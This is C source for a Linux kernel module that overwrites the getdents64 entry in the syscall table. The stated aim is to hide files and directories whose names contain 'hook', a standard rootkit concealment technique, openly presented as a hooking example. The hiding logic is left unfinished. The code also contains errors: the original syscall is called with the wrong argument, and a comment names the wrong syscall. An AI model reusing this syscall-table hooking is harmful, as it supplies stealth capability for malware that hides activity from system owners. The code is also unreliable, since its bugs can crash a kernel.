#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/slab.h>

#include "my_memory.h"

#define IGNORE_TEXT "hook"                      //<- Text on file/dir to hide. If a file contains this text, hides it

static unsigned long *__sys_call_table;                         //<- Pointer to the Kernel syscall table

asmlinkage long (*original_getdents64) (const struct pt_regs *regs);


asmlinkage int hooked_getdents64(const struct pt_regs *regs)
{
        struct linux_dirent64 __user * direntry;      //<- Pointer to real direntry
        struct linux_dirent64 * direntry_final;       //<- Pointer to direntries without the ones to hide
        long n_size;                                  //<- Total size for all direntries

        pr_info("   Syscall hooked.\n");

        direntry = (struct linux_dirent64 *) regs->si; //<- @ referenced in RSI register

        n_size = original_getdents64(direntry);        //<- Call the original getdents64 syscall
                                                       //   With this we get all the dir entries   

        direntry_final = (struct linux_dirent64 *) kzalloc(n_size, GFP_KERNEL);  //<- Reserve space for direntries without the
                                                                                 //   ones to hide




        kfree(direntry_final);                          //<- Free the final direntry

        return n_size;
}


static int __init lkm_init(void)
{
        pr_info("Loading Module...\n");

        __sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");     //<- Get address for Kernel Syscall Table

        if (__sys_call_table == NULL) {
                pr_err("  Can't find syscall table!.\n");
                return -1;
        }

        original_getdents64 = (void *) __sys_call_table[__NR_getdents64];       //<- Save actual address for sys_shutdown

        my_memory_rw();         

        __sys_call_table[__NR_getdents64] = (unsigned long) hooked_getdents64;   //<- Replace the syscall pointer in the syscall table

        my_memory_ro();

        return 0;
}

static void __exit lkm_exit(void)
{
        pr_info("Exiting... Bye.\n");

        my_memory_rw();

        __sys_call_table[__NR_getdents64] = (unsigned long) original_getdents64;

        my_memory_ro();

}

module_init(lkm_init);           //<- Tells that Init Kernel Module is the lkm_init function
module_exit(lkm_exit);          //<- Tells that Exit Kernel Function is lkm_exit

MODULE_AUTHOR("Guillem Alminyana");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("LKM Hook Syscall Example");

